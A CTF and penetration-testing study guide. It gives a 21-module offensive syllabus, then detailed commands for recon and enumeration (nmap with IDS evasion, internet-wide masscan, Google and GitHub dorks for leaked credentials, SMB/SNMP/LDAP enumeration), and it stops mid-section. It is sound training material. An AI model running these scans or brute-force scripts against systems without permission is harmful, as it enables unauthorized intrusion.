# Syllabus

## Module 1: Reconnaissance & Information Gathering

- Passive Information Gathering
- Active Information Gathering
- OSINT Techniques
- DNS Enumeration
- Subdomain Discovery
- WHOIS Lookups
- Port Scanning (TCP/UDP)
- Service Enumeration
- OS Fingerprinting
- Banner Grabbing
- Network Mapping
- Vulnerability Scanning
- Web Application Reconnaissance
- SSL/TLS Certificate Analysis
- Email Harvesting
- Metadata Extraction
- Social Media Intelligence

## Module 2: Network Scanning & Enumeration

- Host Discovery
- Service Version Detection
- Script Scanning (NSE)
- Network Topology Mapping
- VLAN Discovery
- Wireless Network Enumeration
- IPv6 Enumeration
- NetBIOS Enumeration
- SNMP Enumeration
- LDAP Enumeration
- NFS Enumeration
- RPC Enumeration
- ARP Scanning

## Module 3: Windows-Specific Enumeration

- SMB Enumeration
- Active Directory Enumeration
- Domain Controller Discovery
- User Enumeration
- Share Enumeration
- Group Policy Enumeration
- Kerberos Enumeration
- MSSQL Enumeration
- WinRM Enumeration
- RDP Enumeration
- Windows Registry Analysis
- PowerShell Remoting Discovery
- Windows Event Log Analysis

## Module 4: Linux/Unix-Specific Enumeration

- SSH Enumeration
- NFS Share Discovery
- Linux Service Enumeration
- User Account Enumeration
- Cron Job Discovery
- SUDO Privilege Enumeration
- Kernel Version Detection
- Package Manager Analysis
- Process Enumeration
- Network Configuration Analysis
- Firewall Rule Discovery
- SELinux/AppArmor Detection

## Module 5: Web Application Assessment

- Web Server Identification
- CMS Detection
- Directory/File Enumeration
- Hidden Parameter Discovery
- Web Technology Stack Identification
- Robots.txt Analysis
- Sitemap Discovery
- API Endpoint Discovery
- JavaScript Analysis
- Cookie Analysis
- Session Management Assessment
- Authentication Mechanism Identification
- Input Validation Testing Points

## Module 6: Remote Access via Exploitation

- Buffer Overflow Exploitation
- Format String Vulnerabilities
- Injection Attacks (SQL, Command, LDAP, XPath)
- Deserialization Vulnerabilities
- File Upload Vulnerabilities
- Local File Inclusion (LFI)
- Remote File Inclusion (RFI)
- XXE (XML External Entity)
- SSRF (Server-Side Request Forgery)
- Template Injection
- Race Conditions
- Memory Corruption Exploits

## Module 7: Authentication & Credential Attacks

- Brute Force Attacks
- Dictionary Attacks
- Password Spraying
- Credential Stuffing
- Hash Cracking (MD5, SHA, NTLM, Kerberos)
- Pass-the-Hash
- Pass-the-Ticket
- Kerberoasting
- AS-REP Roasting
- Golden Ticket Attacks
- Silver Ticket Attacks
- Token Impersonation
- Cookie Hijacking
- Session Fixation

## Module 8: Remote Access via Valid Credentials

- SSH Access
- RDP Access
- Telnet Access
- VNC Access
- WinRM Access
- PowerShell Remoting
- FTP/SFTP Access
- SMB Access
- Database Remote Access
- Web Shell Access
- Reverse Shell Techniques
- Bind Shell Techniques
- Meterpreter Sessions

## Module 9: Wireless Network Access

- WEP Cracking
- WPA/WPA2 Cracking
- WPA3 Attacks
- WPS PIN Attacks
- Evil Twin Attacks
- Rogue Access Point Setup
- Captive Portal Bypass
- Bluetooth Enumeration
- Bluetooth Exploitation
- RFID/NFC Analysis

## Module 10: Man-in-the-Middle Attacks

- ARP Spoofing
- DNS Spoofing
- DHCP Spoofing
- SSL Stripping
- SSL/TLS Downgrade Attacks
- Traffic Interception
- Packet Sniffing
- Session Hijacking
- Credential Harvesting
- Network Traffic Analysis

## Module 11: Post-Exploitation Enumeration

- System Information Gathering
- User Privilege Enumeration
- Network Connection Enumeration
- Installed Software Discovery
- Running Process Analysis
- Service Configuration Analysis
- Scheduled Task Discovery
- Credential Dumping
- Password Store Extraction
- Browser Credential Extraction
- File System Analysis
- Log File Analysis
- Configuration File Analysis

## Module 12: Privilege Escalation Vectors

- SUID/SGID Binary Exploitation
- Sudo Misconfiguration Exploitation
- Kernel Exploits
- Service Exploitation
- DLL Hijacking
- PATH Hijacking
- Unquoted Service Path
- AlwaysInstallElevated
- Token Manipulation
- Scheduled Task Exploitation
- Capability Exploitation
- Container Escape Techniques

## Module 13: Lateral Movement Techniques

- Pass-the-Hash Lateral Movement
- Pass-the-Ticket Lateral Movement
- Remote Service Execution
- WMI Remote Execution
- DCOM Exploitation
- PSExec Usage
- SSH Tunneling
- Port Forwarding
- Pivoting Techniques
- ProxyChains Configuration
- Chisel Tunneling
- Ligolo Tunneling

## Module 14: Persistence Mechanisms

- Backdoor Creation
- Service Installation
- Registry Modification
- Scheduled Task Creation
- Cron Job Creation
- Startup Script Modification
- User Account Creation
- SSH Key Installation
- Web Shell Deployment
- Rootkit Installation
- Bootkit Techniques
- DLL Persistence

## Module 15: Steganography & Data Exfiltration

- Image Steganography Analysis
- Audio Steganography Analysis
- File Carving
- Hidden Data Extraction
- Encrypted Archive Analysis
- Data Encoding/Decoding (Base64, Hex, Binary)
- Alternative Data Streams (ADS)
- DNS Exfiltration
- ICMP Exfiltration
- HTTP/HTTPS Exfiltration

## Module 16: Cryptography & Reverse Engineering

- Hash Identification
- Encryption Algorithm Identification
- Cipher Analysis
- Binary Analysis
- Malware Analysis
- Decompilation Techniques
- Debugger Usage
- Dynamic Analysis
- Static Analysis
- Code Obfuscation Techniques
- Anti-Debugging Detection

## Module 17: Cloud & Container Enumeration

- AWS Enumeration
- Azure Enumeration
- GCP Enumeration
- Docker Enumeration
- Kubernetes Enumeration
- Container Registry Access
- Cloud Storage Bucket Discovery
- IAM Role Enumeration
- Cloud Metadata Service Exploitation
- Container Misconfiguration Exploitation

## Module 18: Mobile & IoT Assessment

- Android Application Analysis
- iOS Application Analysis
- Mobile Device Enumeration
- IoT Device Discovery
- Firmware Analysis
- MQTT Enumeration
- CoAP Protocol Analysis
- Zigbee/Z-Wave Analysis
- Embedded Device Exploitation

## Module 19: Forensics & Artifact Analysis

- Memory Dump Analysis
- Disk Image Analysis
- Network Packet Analysis
- Log File Forensics
- Timeline Analysis
- File System Forensics
- Deleted File Recovery
- Browser History Analysis
- Email Forensics
- Registry Forensics

## Module 20: Tool Mastery (Kali Linux Specific)

- Nmap Advanced Usage
- Metasploit Framework
- Burp Suite Professional
- Wireshark/Tshark
- John the Ripper
- Hashcat
- Hydra
- SQLmap
- Gobuster/Dirbuster
- Nikto
- Aircrack-ng Suite
- Responder
- Impacket Suite
- BloodHound/SharpHound
- Mimikatz
- CrackMapExec
- Evil-WinRM
- Chisel/Ligolo
- LinPEAS/WinPEAS

## Module 21: Reporting & Documentation

- Evidence Collection
- Screenshot Documentation
- Command Output Logging
- Finding Classification
- Risk Assessment
- Remediation Recommendations
- Executive Summary Writing
- Technical Report Writing

---

**Note:** This syllabus covers topics for educational CTF competitions and authorized penetration testing only. All techniques should only be applied to systems you own or have explicit written permission to test.

---

# Reconnaissance & Information Gathering

Reconnaissance is the critical first phase of any CTF challenge or penetration test, where you gather intelligence about your target without triggering defensive mechanisms. This phase divides into passive (non-intrusive) and active (direct interaction) approaches.

## Passive Information Gathering

Passive reconnaissance involves collecting publicly available information without directly interacting with the target infrastructure.

### WHOIS Lookups

```bash
whois example.com
whois 192.168.1.1
```

WHOIS databases reveal domain registration details, registrant contact information, name servers, and registration dates. For CTF challenges, look for:

- Administrative email addresses (potential usernames)
- Name server configurations
- Domain expiration dates
- Historical WHOIS data using `whois -h whois.domaintools.com example.com`

### Website Analysis

**Tools: Netcraft, BuiltWith, Wappalyzer**

```bash
# Netcraft site report (web interface primarily)
# Reveals hosting history, technology stack, SSL/TLS configurations

# Wayback Machine (archive.org)
# Access historical versions of websites
curl "http://archive.org/wayback/available?url=example.com"
```

Examine HTML source code for:

- Comments containing sensitive information
- Hidden form fields
- JavaScript files with API endpoints
- Meta tags revealing CMS versions

### Google Dorking

Advanced Google search operators to find exposed sensitive information:

```
site:example.com filetype:pdf
site:example.com inurl:admin
site:example.com intitle:"index of"
site:example.com ext:sql | ext:txt | ext:log
cache:example.com
```

**Critical operators:**

- `site:` - Restrict results to specific domain
- `filetype:` - Find specific file types
- `inurl:` - Search within URLs
- `intitle:` - Search page titles
- `cache:` - View Google's cached version
- `-` - Exclude terms
- `"exact phrase"` - Exact matching

### Shodan & Censys

Internet-wide scanning engines for discovering exposed services:

```bash
# Shodan CLI (requires API key)
shodan init YOUR_API_KEY
shodan search "port:22 country:US"
shodan host 192.168.1.1
shodan count apache

# Common Shodan queries
"default password" port:80
"authentication disabled" port:23
has_screenshot:true hostname:example.com
```

**Censys (alternative to Shodan):**

```bash
# Censys CLI
censys search "services.service_name: HTTP"
censys view 192.168.1.1
```

### theHarvester

Email and subdomain enumeration tool:

```bash
theHarvester -d example.com -b all
theHarvester -d example.com -b google,bing,yahoo -l 500
theHarvester -d example.com -b dnsdumpster,virustotal
```

**Key parameters:**

- `-d` - Target domain
- `-b` - Data source (google, bing, linkedin, twitter, all)
- `-l` - Limit results
- `-f` - Output to HTML/XML

### Social Media Intelligence

Manual reconnaissance across platforms:

- LinkedIn: Employee names, job titles, technology stacks
- GitHub: Leaked credentials, configuration files, internal code
- Twitter: Technology announcements, employee information
- Pastebin: Credential dumps, leaked data

```bash
# Search GitHub for exposed credentials
# (Use GitHub advanced search web interface)
filename:config.php password
extension:env DB_PASSWORD
```

## Active Information Gathering

Active reconnaissance involves direct interaction with the target, generating traffic that may be logged.

### Network Scanning with Nmap

**Host Discovery:**

```bash
# Ping scan (ICMP echo)
nmap -sn 192.168.1.0/24

# TCP SYN ping
nmap -PS22,80,443 192.168.1.0/24

# UDP ping
nmap -PU 192.168.1.0/24

# Disable ping (assume host is up)
nmap -Pn 192.168.1.1
```

**Port Scanning Techniques:**

```bash
# TCP SYN scan (default, requires root)
nmap -sS 192.168.1.1

# TCP Connect scan (no root required)
nmap -sT 192.168.1.1

# UDP scan
nmap -sU 192.168.1.1

# Scan specific ports
nmap -p 22,80,443 192.168.1.1
nmap -p- 192.168.1.1  # All 65535 ports

# Top 1000 ports (default)
nmap 192.168.1.1

# Fast scan (top 100 ports)
nmap -F 192.168.1.1
```

**Service and Version Detection:**

```bash
# Service version detection
nmap -sV 192.168.1.1

# Aggressive version detection
nmap -sV --version-intensity 9 192.168.1.1

# OS detection
nmap -O 192.168.1.1

# Aggressive scan (OS, version, script, traceroute)
nmap -A 192.168.1.1
```

**Nmap Scripting Engine (NSE):**

```bash
# Default scripts
nmap -sC 192.168.1.1

# Specific script category
nmap --script vuln 192.168.1.1
nmap --script exploit 192.168.1.1

# Individual script
nmap --script http-enum 192.168.1.1
nmap --script smb-os-discovery 192.168.1.1

# List available scripts
ls /usr/share/nmap/scripts/ | grep ftp
```

**Timing and Performance:**

```bash
# Timing templates (0-5, paranoid to insane)
nmap -T4 192.168.1.1  # Aggressive (CTF standard)
nmap -T0 192.168.1.1  # Paranoid (IDS evasion)

# Parallel scanning
nmap --min-parallelism 100 192.168.1.0/24
```

**Output Formats:**

```bash
# All formats simultaneously
nmap -oA scan_results 192.168.1.1

# Normal output
nmap -oN results.txt 192.168.1.1

# Grepable output
nmap -oG results.grep 192.168.1.1

# XML output
nmap -oX results.xml 192.168.1.1
```

### Netcat (nc)

Swiss Army knife for network connections:

```bash
# Banner grabbing
nc -nv 192.168.1.1 22
nc -nv 192.168.1.1 80

# HTTP request
echo -e "GET / HTTP/1.0\r\n\r\n" | nc 192.168.1.1 80

# Port scanning (basic)
nc -zv 192.168.1.1 1-1000

# UDP connection
nc -u 192.168.1.1 53

# Listening mode (receive connections)
nc -lvnp 4444
```

### Masscan

High-speed port scanner:

```bash
# Scan entire internet for port 80
masscan 0.0.0.0/0 -p80 --rate 10000

# Scan specific network
masscan 192.168.1.0/24 -p80,443,8080 --rate 1000

# Output to file
masscan 192.168.1.0/24 -p1-65535 -oL results.txt
```

[Inference] Masscan is significantly faster than Nmap but provides less detailed service detection.

### Service-Specific Enumeration

**HTTP/HTTPS:**

```bash
# Nikto web scanner
nikto -h http://example.com
nikto -h http://example.com -Tuning 9  # All tests

# WhatWeb
whatweb http://example.com
whatweb -v http://example.com  # Verbose
```

**SMB (Windows):**

```bash
# Enum4linux
enum4linux -a 192.168.1.1

# SMBClient
smbclient -L //192.168.1.1 -N  # List shares
smbclient //192.168.1.1/share -U username

# SMBMap
smbmap -H 192.168.1.1
smbmap -H 192.168.1.1 -u username -p password
```

**SNMP:**

```bash
# onesixtyone (SNMP scanner)
onesixtyone -c community.txt 192.168.1.1

# snmpwalk
snmpwalk -c public -v1 192.168.1.1
snmpwalk -c public -v2c 192.168.1.1 1.3.6.1.4.1.77.1.2.25
```

## OSINT Techniques

Open Source Intelligence gathering from publicly available sources.

### Subdomain Enumeration

**Sublist3r:**

```bash
sublist3r -d example.com
sublist3r -d example.com -e google,bing,yahoo
```

**Amass:**

```bash
amass enum -d example.com
amass enum -passive -d example.com  # Passive only
amass enum -active -d example.com   # Active DNS resolution
amass enum -brute -d example.com    # Brute force
```

**Assetfinder:**

```bash
assetfinder --subs-only example.com
```

**Manual DNS Brute Force:**

```bash
# DNSRecon
dnsrecon -d example.com -t std
dnsrecon -d example.com -D subdomains.txt -t brt

# Fierce
fierce --domain example.com
```

### Email Pattern Identification

Tools to identify organizational email formats:

```bash
# theHarvester (covered earlier)
theHarvester -d example.com -b linkedin

# Manual pattern analysis
# Common patterns:
# firstname.lastname@example.com
# firstnamelastname@example.com
# firstname@example.com
# f.lastname@example.com
```

### Certificate Transparency Logs

Search SSL certificate logs for subdomains:

```bash
# crt.sh (web interface or API)
curl "https://crt.sh/?q=%25.example.com&output=json" | jq

# Online tools: crt.sh, censys.io
```

### GitHub Reconnaissance

```bash
# GitDorker (automated GitHub dorking)
python3 GitDorker.py -tf tokens.txt -q example.com -d dorks.txt

# Gitrob (find sensitive files)
gitrob analyze username/repo

# TruffleHog (find secrets in git history)
trufflehog git https://github.com/username/repo
```

### Metadata Extraction

```bash
# ExifTool (image/document metadata)
exiftool image.jpg
exiftool -r /path/to/directory  # Recursive

# FOCA (Windows tool, run in Wine)
# GUI-based metadata extraction from documents

# metagoofil (document metadata)
metagoofil -d example.com -t pdf,doc,xls -l 100 -o output
```

## DNS Enumeration

DNS provides critical infrastructure information and potential attack vectors.

### Basic DNS Queries

```bash
# Host command
host example.com
host -t mx example.com  # Mail servers
host -t ns example.com  # Name servers
host -t txt example.com # TXT records

# Dig command
dig example.com
dig example.com A
dig example.com MX
dig example.com NS
dig example.com ANY
dig @8.8.8.8 example.com  # Query specific DNS server

# Reverse DNS lookup
dig -x 192.168.1.1
host 192.168.1.1
```

### DNS Zone Transfer

Attempt to retrieve entire DNS zone database (often misconfigured):

```bash
# Identify name servers first
host -t ns example.com

# Attempt zone transfer
dig axfr @ns1.example.com example.com
host -l example.com ns1.example.com

# DNSRecon zone transfer
dnsrecon -d example.com -t axfr

# Fierce (attempts zone transfer automatically)
fierce --domain example.com
```

### DNS Brute Forcing

```bash
# DNSRecon with wordlist
dnsrecon -d example.com -D /usr/share/wordlists/dnsmap.txt -t brt

# Gobuster DNS mode
gobuster dns -d example.com -w /usr/share/wordlists/subdomains.txt

# DNSEnum
dnsenum example.com
dnsenum --enum example.com -f subdomains.txt

# Fierce
fierce --domain example.com --subdomain-file subdomains.txt
```

### DNS Cache Snooping

Check if specific domains are cached on DNS server:

```bash
# Non-recursive query
dig @192.168.1.1 example.com +norecurse
```

### DNS Record Types

Key DNS record types for enumeration:

- **A** - IPv4 address
- **AAAA** - IPv6 address
- **MX** - Mail exchange servers
- **NS** - Name servers
- **TXT** - Text records (SPF, DKIM, verification)
- **CNAME** - Canonical name (alias)
- **PTR** - Pointer (reverse DNS)
- **SOA** - Start of authority
- **SRV** - Service records

```bash
# Query all record types
dig example.com ANY +noall +answer
```

### Advanced DNS Tools

**DNSRecon (comprehensive):**

```bash
# Standard enumeration
dnsrecon -d example.com

# Zone transfer
dnsrecon -d example.com -t axfr

# Brute force subdomains
dnsrecon -d example.com -t brt -D wordlist.txt

# Reverse lookup
dnsrecon -r 192.168.1.0/24

# Cache snooping
dnsrecon -t snoop -D domains.txt -n 192.168.1.1
```

**DNSEnum:**

```bash
# Full enumeration
dnsenum example.com

# With custom wordlist
dnsenum example.com -f wordlist.txt

# Skip reverse lookup
dnsenum example.com --noreverse
```

### CTF-Specific Considerations

**Reconnaissance checklist for CTF challenges:**

1. **Scan all ports** - Don't rely on common ports only
2. **Check UDP services** - Often overlooked (SNMP, DNS)
3. **Banner grab everything** - Versions reveal vulnerabilities
4. **Test default credentials** - admin/admin, root/root, etc.
5. **Enumerate users** - SMTP VRFY, SMB, LDAP
6. **Check robots.txt** - Disallowed paths in web apps
7. **Examine SSL certificates** - Subdomains in SAN field
8. **Test DNS zone transfers** - Misconfigured servers
9. **Search Exploit-DB** - Match service versions to known exploits
10. **Document everything** - Track services, versions, findings

**Common CTF reconnaissance mistakes:**

- Skipping UDP scans (DNS, SNMP often vulnerable)
- Ignoring high ports (many services run above 10000)
- Not testing for zone transfers
- Overlooking subdomain enumeration
- Missing metadata in files
- Failing to check source code comments

**Important Related Topics**

For comprehensive CTF preparation, investigate these connected topics:

- **Vulnerability Scanning** (Nessus, OpenVAS, Nikto) - Automated vulnerability identification
- **Web Application Enumeration** (dirb, gobuster, ffuf) - Directory and file discovery
- **Network Traffic Analysis** (Wireshark, tcpdump) - Packet capture during reconnaissance
- **Exploitation Frameworks** (Metasploit, SearchSploit) - Matching findings to exploits

---

## Subdomain Discovery

Subdomain enumeration reveals attack surface by identifying additional hosts within a target domain. Each subdomain may run different services, use different security controls, or expose sensitive development/staging environments.

### Passive Subdomain Discovery

**Certificate Transparency Logs**

```bash
# crt.sh - query CT logs
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u

# Alternative: certspotter
curl -s "https://api.certspotter.com/v1/issuances?domain=target.com&include_subdomains=true&expand=dns_names" | jq -r '.[].dns_names[]' | sort -u
```

**DNS Aggregators**

```bash
# Sublist3r - aggregates multiple sources
sublist3r -d target.com -o subdomains.txt

# Amass - comprehensive OSINT enumeration
amass enum -d target.com -o amass_output.txt
amass enum -passive -d target.com  # passive-only mode
amass enum -active -d target.com -brute  # active + bruteforce
```

**Search Engine Queries**

```bash
# Google dorking for subdomains
site:*.target.com -www

# Using gau (Get All URLs) from Wayback/Common Crawl
echo "target.com" | gau --subs | unfurl -u domains | sort -u
```

### Active Subdomain Discovery

**DNS Bruteforcing**

```bash
# dnsrecon - multiple enumeration modes
dnsrecon -d target.com -t brt -D /usr/share/wordlists/dnsmap.txt

# gobuster DNS mode
gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50

# puredns - fast DNS bruteforcing with wildcard detection
puredns bruteforce /usr/share/seclists/Discovery/DNS/all.txt target.com -r resolvers.txt
```

**DNS Zone Transfers** [Inference: Rarely successful on modern infrastructure]

```bash
# Attempt AXFR zone transfer
dig axfr @ns1.target.com target.com

# dnsrecon zone transfer attempt
dnsrecon -d target.com -t axfr
```

**Permutation/Alteration Scanning**

```bash
# altdns - generates permutations of known subdomains
altdns -i known_subdomains.txt -o permutations.txt -w /usr/share/seclists/Discovery/DNS/words.txt
altdns -i known_subdomains.txt -o permutations.txt -r -s resolved_permutations.txt

# dnsgen - similar permutation generation
cat known_subdomains.txt | dnsgen - | puredns resolve -r resolvers.txt
```

### Validation & Probing

```bash
# httpx - probe for live HTTP services
cat subdomains.txt | httpx -silent -status-code -title -tech-detect -o live_subdomains.txt

# dnsx - validate DNS resolution with additional records
cat subdomains.txt | dnsx -silent -a -cname -mx -ns -txt -resp

# massdns - high-speed DNS resolution validation
massdns -r resolvers.txt -t A subdomains.txt -o S -w resolved.txt
```

---

## WHOIS Lookups

WHOIS queries retrieve registration data for domains, IP blocks, and autonomous systems. This data reveals organizational infrastructure, contact information, and related assets.

### Domain WHOIS

```bash
# Standard WHOIS query
whois target.com

# Extract specific fields
whois target.com | grep -E "(Registrar|Name Server|Creation Date|Registry Expiry)"

# whois with specific server
whois -h whois.verisign-grs.com target.com
```

**Key WHOIS Data Points:**

- **Registrar**: Hosting/registration provider
- **Name Servers**: DNS infrastructure (may reveal cloud provider)
- **Registration/Expiry Dates**: Domain age (older domains may have legacy configurations)
- **Registrant Contact**: Organization details (often redacted via privacy protection)
- **DNSSEC**: Security extensions enabled/disabled

### IP/ASN WHOIS

```bash
# IP WHOIS lookup
whois 192.0.2.1

# ASN lookup
whois -h whois.cymru.com " -v AS15169"

# Bulk IP/ASN queries with cymru
echo "8.8.8.8" | netcat whois.cymru.com 43

# whois via RIPEstat (programmatic)
curl "https://stat.ripe.net/data/whois/data.json?resource=192.0.2.0/24"
```

### Reverse WHOIS

Identify related domains by shared registration data:

```bash
# Manual via whois + grep across multiple domains
for domain in $(cat domains.txt); do whois $domain | grep "Registrant Organization"; done | sort -u

# whoxy API (requires API key)
curl "http://api.whoxy.com/?key=API_KEY&reverse=whois&company=Target+Corp"
```

### Automated WHOIS Tools

```bash
# DOMLink - domain relationship mapping
# [Unverified: Tool availability varies]

# Amass with WHOIS integration
amass intel -d target.com -whois

# theHarvester includes WHOIS data
theHarvester -d target.com -b all
```

---

## Port Scanning (TCP/UDP)

Port scanning identifies open network services by probing TCP/UDP ports. Different techniques balance speed, stealth, and accuracy.

### TCP Scanning with Nmap

**SYN Scan (Default, Requires Root)**

```bash
# Basic SYN scan - sends SYN, analyzes SYN-ACK response
nmap -sS target.com

# Common ports scan
nmap -sS --top-ports 1000 target.com

# Full port range
nmap -sS -p- target.com

# Specific port range
nmap -sS -p 1-1024,3000-4000,8000-9000 target.com
```

**Connect Scan (No Root Required)**

```bash
# TCP connect scan - completes full three-way handshake
nmap -sT target.com

# Faster with timing template
nmap -sT -T4 target.com
```

**Timing & Performance**

```bash
# T0-T5 timing templates (T0=paranoid, T5=insane)
nmap -sS -T4 target.com  # aggressive timing

# Custom rate limiting
nmap -sS --min-rate 1000 --max-rate 5000 target.com

# Parallel host scanning
nmap -sS -iL targets.txt --min-hostgroup 50
```

**Firewall/IDS Evasion** [Inference: Effectiveness depends on target filtering rules]

```bash
# Fragment packets
nmap -sS -f target.com

# Decoy scanning
nmap -sS -D RND:10 target.com  # 10 random decoys
nmap -sS -D decoy1,decoy2,ME,decoy3 target.com  # manual decoys

# Source port manipulation
nmap -sS --source-port 53 target.com  # spoof DNS port

# Randomize target order
nmap -sS --randomize-hosts -iL targets.txt
```

### UDP Scanning

UDP scanning is slower due to lack of handshake and rate limiting on ICMP responses.

```bash
# Basic UDP scan (slow)
nmap -sU target.com

# Top UDP ports
nmap -sU --top-ports 100 target.com

# Specific UDP services
nmap -sU -p 53,67,68,69,123,161,162,500,514,520 target.com

# Version detection for UDP (helps confirm open vs filtered)
nmap -sU -sV --version-intensity 0 target.com

# Combined TCP/UDP scan
nmap -sS -sU -p T:80,443,U:53,161 target.com
```

**UDP Scan States:**

- **Open**: Service responds
- **Closed**: ICMP port unreachable received
- **Open|Filtered**: No response (most common - ambiguous)

### Alternative Scanning Tools

**Masscan - High-Speed Internet Scanner**

```bash
# Extreme-speed SYN scanning (requires root)
masscan -p1-65535 target.com --rate 10000

# Top ports scan
masscan -p80,443,8080,8443 0.0.0.0/0 --rate 100000 --exclude 255.255.255.255

# Output to file
masscan -p1-65535 10.0.0.0/8 --rate 50000 -oG masscan_output.txt
```

**RustScan - Fast Port Scanner with Nmap Integration**

```bash
# Fast initial scan, pipes to nmap for service detection
rustscan -a target.com -- -sV -sC

# Scan multiple targets
rustscan -a target.com,192.168.1.0/24 --ulimit 5000

# Scan specific ports
rustscan -a target.com -p 22,80,443,3389,8080
```

**Unicornscan - Distributed/Correlation Scanner**

```bash
# TCP SYN scan
unicornscan -mT target.com:1-65535

# UDP scan
unicornscan -mU target.com:1-1024

# Combined with rate limiting
unicornscan -mT -r 1000 target.com:a
```

### OS-Specific Considerations

**Linux:**

- Raw socket access requires root/CAP_NET_RAW capability
- `/proc/sys/net/ipv4/ip_local_port_range` affects source port availability

**Windows:**

- Nmap requires WinPcap/Npcap for raw packet operations
- Windows Firewall may block scanning tools
- Limited raw socket support in standard user context

---

## Service Enumeration

Service enumeration identifies specific software versions and configurations on discovered open ports. Version information reveals known vulnerabilities and exploitation paths.

### Nmap Service Detection

**Version Detection**

```bash
# Basic version detection
nmap -sV target.com

# Intensity levels (0-9, default 7)
nmap -sV --version-intensity 9 target.com  # aggressive
nmap -sV --version-intensity 0 target.com  # light/fast

# Version detection with scripts
nmap -sV -sC target.com  # default script scan

# Specific ports
nmap -sV -p 80,443,8080 target.com
```

**Default Scripts (NSE)**

```bash
# Run default safe scripts
nmap -sC target.com

# Equivalent to:
nmap --script=default target.com

# Verbose script output
nmap -sC --script-trace target.com
```

**Targeted Script Categories**

```bash
# Discovery scripts
nmap --script=discovery target.com

# Vulnerability detection
nmap --script=vuln target.com

# Brute force scripts
nmap --script=brute -p 21,22,23,3389 target.com

# Multiple categories
nmap --script="default,safe,vuln" target.com
```

### Protocol-Specific Enumeration

**HTTP/HTTPS (80, 443, 8080, 8443)**

```bash
# HTTP methods and headers
nmap -p 80,443 --script http-methods,http-headers target.com

# Web application detection
nmap -p 80,443 --script http-enum target.com
whatweb target.com
wappalyzer target.com  # [Unverified: Command-line availability]

# Directory bruteforcing (covered more in later modules)
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# WAF detection
wafw00f http://target.com
nmap -p 443 --script http-waf-detect target.com
```

**FTP (21)**

```bash
# Anonymous login check
nmap -p 21 --script ftp-anon target.com

# Banner grabbing
nc target.com 21

# FTP bounce attack check
nmap -p 21 --script ftp-bounce target.com
```

**SSH (22)**

```bash
# SSH version and supported methods
nmap -p 22 --script ssh-auth-methods,ssh2-enum-algos target.com

# SSH key algorithms
ssh -v target.com 2>&1 | grep "kex\|host key\|cipher\|mac"

# User enumeration [Inference: CVE-2018-15473 on older OpenSSH]
nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=root" target.com
```

**SMB (139, 445)**

```bash
# SMB version detection
nmap -p 445 --script smb-protocols target.com

# Share enumeration
nmap -p 445 --script smb-enum-shares target.com
smbclient -L //target.com -N

# OS detection via SMB
nmap -p 445 --script smb-os-discovery target.com

# Security settings
nmap -p 445 --script smb-security-mode target.com

# User enumeration
enum4linux -a target.com
nmap -p 445 --script smb-enum-users target.com
```

**SMTP (25, 587)**

```bash
# SMTP commands and VRFY/EXPN
nmap -p 25 --script smtp-commands,smtp-enum-users target.com

# Manual banner grab
nc target.com 25
EHLO test

# Open relay check
nmap -p 25 --script smtp-open-relay target.com
```

**DNS (53)**

```bash
# DNS enumeration
nmap -p 53 --script dns-nsid,dns-recursion target.com

# DNS zone transfer attempt
nmap -p 53 --script dns-zone-transfer --script-args dns-zone-transfer.domain=target.com target.com

# Cache snooping
nmap -p 53 --script dns-cache-snoop target.com
```

**SNMP (161/UDP)**

```bash
# SNMP version detection
nmap -sU -p 161 --script snmp-sysdescr target.com

# Community string bruteforce
nmap -sU -p 161 --script snmp-brute target.com
onesixtyone -c /usr/share/doc/onesixtyone/dict.txt target.com

# SNMP walk
snmpwalk -v2c -c public target.com
snmpwalk -v2c -c public target.com 1.3.6.1.4.1  # enterprise MIBs
```

**LDAP (389, 636)**

```bash
# Base DN enumeration
nmap -p 389 --script ldap-rootdse target.com

# LDAP search
ldapsearch -x -H ldap://target.com -s base namingContexts
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com"
```

**RDP (3389)**

```bash
# RDP security settings
nmap -p 3389 --script rdp-enum-encryption target.com

# NLA detection
nmap -p 3389 --script rdp-ntlm-info target.com
```

**MySQL/MSSQL/PostgreSQL**

```bash
# MySQL info
nmap -p 3306 --script mysql-info target.com

# MSSQL info
nmap -p 1433 --script ms-sql-info target.com

# PostgreSQL version
nmap -p 5432 --script pgsql-brute target.com  # includes version in output
```

### Banner Grabbing

```bash
# Netcat
nc -v target.com 80
GET / HTTP/1.0

# Telnet
telnet target.com 25

# Nmap banner grab
nmap -sV --script=banner target.com

# Automated with Metasploit
use auxiliary/scanner/portscan/tcp
use auxiliary/scanner/http/http_version
```

### Application Fingerprinting

```bash
# Wappalyzer (browser extension) or CLI alternative
webanalyze -host target.com

# WhatWeb - web technology identification
whatweb -v -a 3 target.com

# Nuclei - vulnerability scanner with fingerprinting templates
nuclei -u http://target.com -t ~/nuclei-templates/technologies/

# Retire.js - JavaScript library vulnerability detection
retire --jspath http://target.com --outputformat json
```

### OS Detection

```bash
# Nmap OS fingerprinting (requires root)
nmap -O target.com

# Aggressive detection with version scanning
nmap -A target.com  # includes -O, -sV, -sC, --traceroute

# Specific OS detection scripts
nmap --script smb-os-discovery target.com

# p0f - passive OS fingerprinting
p0f -i eth0 -p  # monitor traffic for OS signatures
```

### Consolidated Enumeration Workflow

```bash
# Phase 1: Fast port discovery
rustscan -a target.com --ulimit 5000 -- -sV -sC -oA nmap_initial

# Phase 2: Service-specific enumeration based on results
# Example: If port 445 open
enum4linux -a target.com
smbmap -H target.com
crackmapexec smb target.com --shares

# Phase 3: Vulnerability correlation
searchsploit <service_name> <version>
nmap --script vuln -p <discovered_ports> target.com
```

**Important Subtopics for CTF Success:**

- **Network Pivoting**: Post-exploitation reconnaissance through compromised hosts
- **Credential Harvesting**: Extracting credentials from enumeration (SNMP community strings, FTP anonymous access)
- **Service Exploitation Mapping**: Correlating discovered versions to CVEs using `searchsploit`, Exploit-DB, or NVD

---

## OS Fingerprinting

OS fingerprinting identifies the target operating system through analysis of network stack implementations, which vary between operating systems.

### Active Fingerprinting

**Nmap TCP/IP Stack Analysis**

```bash
nmap -O <target>
nmap -O --osscan-guess <target>  # Aggressive guessing
nmap -O --osscan-limit <target>  # Only fingerprint promising targets
```

Nmap analyzes TCP ISN sequences, IP ID sequences, TCP options, window sizes, and ICMP responses. The `-O` flag requires at least one open and one closed port for accuracy.

**Specific Protocol Probes**

```bash
# Detailed OS detection with version scanning
nmap -A <target>

